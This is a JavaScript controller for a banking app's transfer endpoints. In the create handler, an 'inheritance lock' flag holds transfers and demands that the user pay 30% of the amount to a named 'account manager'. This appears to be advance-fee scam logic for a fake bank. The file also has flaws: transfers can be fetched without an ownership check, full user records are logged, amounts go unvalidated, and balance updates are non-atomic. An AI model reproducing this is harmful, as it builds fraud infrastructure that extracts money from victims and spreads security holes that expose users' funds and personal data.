const Transfer = require("../models/Transfer");
const Account = require("../models/Account");
const User = require("../models/User");
const { sendTransferNotificationEmail } = require("../services/emailService");
const { notifyFinancialEvent } = require("../services/notificationService");

exports.create = async (req, res) => {
  try {
    const {
      fromAccountId,
      toAccountId,
      amount,
      currency,
      description,
      type,
      scheduleDate,
    } = req.body;
    const from = await Account.findById(fromAccountId);
    const to = await Account.findById(toAccountId);
    if (!from || !to)
      return res.status(404).json({ message: "Account not found" });
    if (!from.checkPermission(req.user._id, "transact"))
      return res.status(403).json({ message: "Forbidden" });

    const senderUser = await User.findById(from.primaryOwner);
    let transferStatus = "pending";
    let alertMessage = null;
console.log(senderUser);
    if (senderUser.inheritanceLocked) {
      transferStatus = "pending_inheritance";
      alertMessage = `Your account has an inheritance lock. To proceed with this transfer, you must pay 30% of the transfer amount (${(
        amount * 0.3
      ).toFixed(
        2
      )} ${currency}) to unlock inheritance rights. Please contact your account manager at joshuahartford@quentbank.com to clarify your inheritance issue. This message will persist until resolved.`;
    }

    const transfer = await Transfer.create({
      sender: from.primaryOwner,
      recipient: to.primaryOwner,
      amount,
      currency,
      status: transferStatus,
      type,
      scheduleDate,
      description: senderUser.inheritanceLocked
        ? `${
            description || ""
          }\n\nINHERITANCE LOCK: Contact your account manager to clarify your inheritance issue.`.trim()
        : description,
      metadata: { fromAccount: fromAccountId, toAccount: toAccountId },
    });

    // immediate transfer logic (naive)
    if (type === "instant" && !senderUser.inheritanceLocked) {
      // ensure withdrawals are enabled on source account
      if (from.limitations && from.limitations.withdrawalsEnabled === false) {
        return res
          .status(403)
          .json({ message: "Withdrawals are disabled on the source account" });
      }
      from.balance -= amount;
      to.balance += amount;
      transfer.status = "completed";
      transfer.completedAt = new Date();
      await from.save();
      await to.save();
      await transfer.save();

      // Send email notifications for completed transfers
      try {
        const [senderUserUpdated, recipientUser] = await Promise.all([
          User.findById(from.primaryOwner),
          User.findById(to.primaryOwner),
        ]);

        const transferDetails = {
          amount: amount,
          fromAccount: from.name,
          toAccount: to.name,
          reference: transfer._id,
          date: transfer.completedAt,
          note: description,
        };

        // Send email to sender (outgoing transfer)
        if (senderUserUpdated) {
          await sendTransferNotificationEmail(
            senderUserUpdated.email,
            `${senderUserUpdated.firstName} ${senderUserUpdated.lastName}`,
            { ...transferDetails, type: "outgoing" }
          );
        }

        // Send email to recipient (incoming transfer)
        if (
          recipientUser &&
          recipientUser._id.toString() !== senderUserUpdated._id.toString()
        ) {
          await sendTransferNotificationEmail(
            recipientUser.email,
            `${recipientUser.firstName} ${recipientUser.lastName}`,
            { ...transferDetails, type: "incoming" }
          );
        }

        console.log("Transfer notification emails sent successfully");
      } catch (emailError) {
        console.error(
          "Failed to send transfer notification emails:",
          emailError
        );
        // Don't fail the transfer if email fails
      }

      // Create notifications for both users
      try {
        await notifyFinancialEvent(from.primaryOwner, "transfer", "outgoing", {
          id: transfer._id,
          amount,
          currency,
          description,
        });

        await notifyFinancialEvent(to.primaryOwner, "transfer", "incoming", {
          id: transfer._id,
          amount,
          currency,
          description,
        });
      } catch (notificationError) {
        console.error(
          "Failed to create transfer notifications:",
          notificationError
        );
        // Don't fail the transfer if notifications fail
      }
    }

    const response = { transfer };
    if (alertMessage) {
      response.alert = alertMessage;
    }
    res.status(201).json(response);
  } catch (err) {
    res.status(400).json({ message: err.message });
  }
};

exports.listForUser = async (req, res) => {
  try {
    const transfers = await Transfer.find({
      $or: [{ sender: req.user._id }, { recipient: req.user._id }],
    }).sort({ createdAt: -1 });
    res.json(transfers);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
};

exports.getById = async (req, res) => {
  try {
    const t = await Transfer.findById(req.params.id);
    if (!t) return res.status(404).json({ message: "Transfer not found" });
    res.json(t);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
};
